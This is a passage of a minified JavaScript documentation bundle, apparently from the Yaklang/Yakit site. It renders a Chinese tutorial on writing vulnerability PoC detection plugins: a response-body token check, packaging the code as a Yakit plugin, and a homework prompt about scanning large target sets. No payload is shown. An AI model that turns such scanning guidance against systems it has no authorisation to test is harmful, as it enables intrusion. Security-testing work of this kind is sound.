\u5224\u65ad\u4e00\u6bb5\u6570\u636e\u4e2d\u662f\u5426\u6ee1\u8db3\u540e\u9762\u7684\u89c4\u5219\u4e2d\u7684\u67d0\u4e00\u6761\u3002")),(0,r.kt)("div",{className:"admonition admonition-note alert alert--secondary"},(0,r.kt)("div",{parentName:"div",className:"admonition-heading"},(0,r.kt)("h5",{parentName:"div"},(0,r.kt)("span",{parentName:"h5",className:"admonition-icon"},(0,r.kt)("svg",{parentName:"span",xmlns:"http://www.w3.org/2000/svg",width:"14",height:"16",viewBox:"0 0 14 16"},(0,r.kt)("path",{parentName:"svg",fillRule:"evenodd",d:"M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"}))),"note")),(0,r.kt)("div",{parentName:"div",className:"admonition-content"},(0,r.kt)("p",{parentName:"div"},"\u5927\u5bb6\u53ef\u4ee5\u53c2\u8003 ",(0,r.kt)("a",{parentName:"p",href:"/docs/api/str#strmatchallofglob"},"str.Match","(","All/Any",")","Of","(","SubString/Glob/Regexp",")"," \u51fd\u6570\u5b9a\u4e49")))),(0,r.kt)("p",null,"\u5728\u5b9e\u9645\u7684\u4f7f\u7528\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u770b DEMO \u4e2d\u662f\u5982\u4f55\u4f7f\u7528\u7684"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-go"},'// \u53d6\u51fa\u53d1\u9001\u7684\u6570\u636e\u5305\u4e2d\u7684\u7ed3\u679c\uff0c\u68c0\u6d4b\u5185\u5bb9\nheaders, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)\nif str.MatchAllOfSubString(body, result) {\n    log.info("find token: %v", result)\n}\n')),(0,r.kt)("p",null,"\u6211\u4eec\u4f7f\u7528\u4e86 ",(0,r.kt)("inlineCode",{parentName:"p"},"str.SplitHTTPHeadersAndBodyFromPacket")," \u6765\u628a\u6570\u636e\u5305\u7684 header \u548c body \u5206\u5f00\uff0c\u7136\u540e\u5bf9 body \u6765\u8fdb\u884c\u5b50\u5b57\u7b26\u4e32\u5339\u914d\u3002"),(0,r.kt)("h2",{id:"\u5236\u4f5c\u4e00\u4e2a-yakit-\u63d2\u4ef6"},"\u5236\u4f5c\u4e00\u4e2a Yakit \u63d2\u4ef6"),(0,r.kt)("p",null,'\u5f53\u6211\u4eec\u4ee3\u7801\u7f16\u5199\u5b8c\u6210\u4e4b\u540e\uff0c\u6211\u53ef\u4ee5\u628a\u5b83\u590d\u5236\u5230 Yakit \u63d2\u4ef6\u53c2\u6570 "\u65b0\u63d2\u4ef6" \u4e2d\u3002\u6211\u4eec\u76f4\u63a5\u6765\u7ed9\u5927\u5bb6\u505a\u5c55\u793a\uff1a'),(0,r.kt)("video",{src:"https://yaklang.oss-cn-beijing.aliyuncs.com/video/code-to-yakit-plugin.mp4",loop:!0,playsInline:!0,controls:!0,autoPlay:!0,style:{width:890}}),(0,r.kt)("p",null,"\u5f53\u7136\uff0c\u6211\u4eec\u4e0a\u9762\u7528\u5230\u4e86\u6211\u4eec\u63d0\u5230\u7684 ",(0,r.kt)("inlineCode",{parentName:"p"},"StatusCard")," \u7279\u6027\uff0c\u5728\u7ed3\u679c\u751f\u6210\u4e86\u4e00\u4e2a\u72b6\u6001\u5361\u7247\u3002"),(0,r.kt)("p",null,"\u6211\u4eec\u4e5f\u53ef\u4ee5\u589e\u52a0\u4e00\u4e9b\u8fdb\u5ea6\u6761\u4e0e\u8f93\u51fa\u65e5\u5fd7\uff0c\u6765\u544a\u8bc9\u5927\u5bb6\u7684\u8fd0\u884c\u6b65\u9aa4\uff01\u8fd9\u6837\u505a\u4f1a\u8ba9\u4f60\u7684\u63d2\u4ef6\u770b\u8d77\u6765\u66f4\u52a0\u4e13\u4e1a\u7f8e\u89c2\u3002"),(0,r.kt)("p",null,"\u6211\u4eec\u53ea\u9700\u8981\u628a ",(0,r.kt)("a",{parentName:"p",href:"/products/article/plugins/plugin_output"},"\u63d2\u4ef6\u7f16\u5199\u6307\u5357\uff1a\u63d2\u4ef6\u4ea4\u4e92\u5f0f\u8f93\u51fa")," \u4e2d\u4ecb\u7ecd\u7684\u4ea4\u4e92\u65b9\u6cd5\u52a0\u4ee5\u5e94\u7528\u5373\u53ef\u751f\u6210\u4e00\u4e2a\u7f8e\u89c2\u597d\u7528\u7684\u63d2\u4ef6\u4e86\uff01"),(0,r.kt)("video",{src:"https://yaklang.oss-cn-beijing.aliyuncs.com/video/code-to-yakit-with-user-interaction.mp4",loop:!0,playsInline:!0,controls:!0,autoPlay:!0,style:{width:890}}),(0,r.kt)("h2",{id:"\u8bfe\u540e\u4f5c\u4e1a\u6269\u5c55"},"\u8bfe\u540e\u4f5c\u4e1a\uff1a\u6269\u5c55"),(0,r.kt)("p",null,"\u6211\u4eec\u7b80\u5355\u5c01\u88c5\u4e86\u4e0a\u8ff0\u6a21\u5757\u4e4b\u540e\uff0c\u6211\u4eec\u4ecd\u7136\u662f\u53ea\u80fd\u9488\u5bf9\u5355\u4f53\u6f0f\u6d1e\u8fdb\u884c\u68c0\u6d4b\uff0c\u90a3\u4e48\u5982\u4f55\u9488\u5bf9\u5927\u89c4\u6a21\u7684\u76ee\u6807\u8fdb\u884c\u626b\u63cf\u5462\uff1f"),(0,r.kt)("p",null,"\u5927\u5bb6\u53ef\u4ee5\u53d1\u6325\u60f3\u8c61\u529b\uff0c",(0,r.kt)("inlineCode",{parentName:"p"},"str.ParseStringToHosts")," \u8fd9\u7c7b\u51fd\u6570\u53ef\u4ee5\u5e2e\u52a9\u5927\u5bb6\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898\u3002\u540c\u6837\u7684\uff0c\u5728\u4e4b\u524d\u7684\u6587\u7ae0\u4e2d\uff0c\u6211\u4eec\u4e5f\u4ecb\u7ecd\u4e86\u4e00\u4e9b\u5185\u5bb9\u6765\u5e2e\u52a9\u5927\u5bb6\u89e3\u51b3\u95ee\u9898\u3002"),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"/docs/newforyak/how_to_make_poc#%E6%BC%8F%E6%B4%9E-poc-%E8%A7%84%E6%A8%A1%E5%8C%96%E6%AD%A6%E5%99%A8%E5%8C%96"},"\u6f0f\u6d1e PoC \u89c4\u6a21\u5316\u9a8c\u8bc1")),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},"Happy Coding!")))}m.isMDXComponent=!0},63873:(e,t,n)=>{n.d(t,{Z:()=>l});var a=n(67294),r=n(86010);const i="tableOfContentsInline_0DDH";function o(e){let{toc:t,isChild:n}=e;return t.length?a.createElement("ul",{className:n?"":"table-of-contents"},t.map((e=>a.createElement("li",{key:e.id},a.createElement("a",{href:`#${e.id}`,dangerouslySetInnerHTML:{__html:e.value}}),a.createElement(o,{isChild:!0,toc:e.children}))))):null}const l=function(e){let{toc:t}=e;return a.createElement("div",{className:(0,r.Z)(i)},a.createElement(o,{toc:t}))}},86010:(e,t,n)=>{function a(e){var t,n,r="";if("string"==typeof e||"number"==typeof e)r+=e;else if("object"==typeof e)if(Array.isArray(e))for(t=0;t<e.length;t++)e[t]&&(n=a(e[t]))&&(r&&(r+=" "),r+=n);else for(t in e)e[t]&&(r&&(r+=" "),r+=t);return r}n.d(t,{Z:()=>r});const r=function(){for(var e,t,n=0,r="";n<arguments.length;)(e=arguments[n++])&&(t=a(e))&&(r&&(r+=" "),r+=t);return r}},87522:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/poc-http-params-c7252cf97ace475c467eb3d974087ab5.png"},753:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/thinkphp-poc-fuzzer-d8be9711ec51ac59913900b39d359956.png"}}]);